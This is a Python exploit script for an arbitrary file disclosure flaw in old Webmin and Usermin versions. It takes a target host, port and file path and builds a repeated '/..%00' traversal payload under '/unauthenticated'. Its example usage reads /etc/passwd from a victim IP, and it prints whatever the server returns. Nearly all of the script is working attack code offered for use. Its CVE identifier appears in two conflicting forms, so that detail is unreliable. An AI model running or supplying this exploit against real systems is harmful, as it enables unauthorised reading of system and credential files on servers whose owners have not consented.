#!/usr/bin/python3

"""
Author: Xtormin (Jennifer Torres)
Twitter: https://twitter.com/xtormin
Title: Webmin < 1.290 Usermin < 1.220 - Arbitrary File Disclosure (Python)
CVE: CVE-2006-23392
Vulnerability: LFI through /unauthenticated flaw
Based on: https://github.com/CyberKnight00/Exploit/blob/master/Webmin%20%3C%201.290%20Usermin%20%3C%201.220%20-%20Arbitrary%20File%20Disclosure/webmin.py
Usage example: python3 CVE-2006-3392.py -p http -H 10.11.1.141 -P 10000 -f /etc/passwd
"""

import argparse
import requests

parser = argparse.ArgumentParser(add_help = True, description = '''
%(prog)s exploit "Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure" with CVE-2006-23392. ''')

parser.add_argument('-p','--http', 
                    help = 'http or https', 
                    nargs = '?', 
                    type=str, 
                    required=True)
parser.add_argument('-H','--host', 
                    help = 'Domain or IP',
                    nargs = '?', 
                    type=str, 
                    required=True)
parser.add_argument('-P','--port', 
                    help = 'Port',
                    nargs = '?', 
                    type=str, 
                    required=True) 
parser.add_argument('-f','--file', 
                    help = 'File in the victim host', 
                    nargs = '?', 
                    type=str)

if __name__=="__main__":
    args = parser.parse_args()

    http = args.http
    host = args.host
    port = args.port
    filename = args.file

    aux = "/..%00"

    payload = aux

    for i in range (50):
        payload += aux
    
    url = f'{http}://{host}:{port}/unauthenticated{payload}/{filename}'

    print("\n|#| CVE-2006-23392")
    print("\nAuthor: Xtormin (https://twitter.com/xtormin)")
    print("Exploit based on: https://github.com/CyberKnight00/Exploit/blob/master/Webmin%20%3C%201.290%20Usermin%20%3C%201.220%20-%20Arbitrary%20File%20Disclosure/webmin.py")
    print(f"Target Url: {url}")
    print(f"Target Filename: {filename}")

    try: 
        r = requests.get(url)

        if r:
            print(f"\n|+| Info of {filename}\n")
            print(r.text)

    except Exception as e:
        print("\n|-| An error has occurred :(\n\nI leave you a hint:\n")
        print(e)
    
    print("Happy hacking }:)")